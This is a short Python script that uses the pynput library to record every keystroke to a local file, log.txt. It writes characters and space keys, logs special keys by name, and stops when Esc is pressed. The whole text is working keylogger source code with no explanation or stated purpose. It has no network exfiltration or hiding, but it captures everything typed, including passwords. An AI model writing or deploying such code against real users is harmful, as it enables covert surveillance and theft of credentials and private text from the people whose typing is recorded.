from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                log.write(" ")
            else:
                log.write(f"{key}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
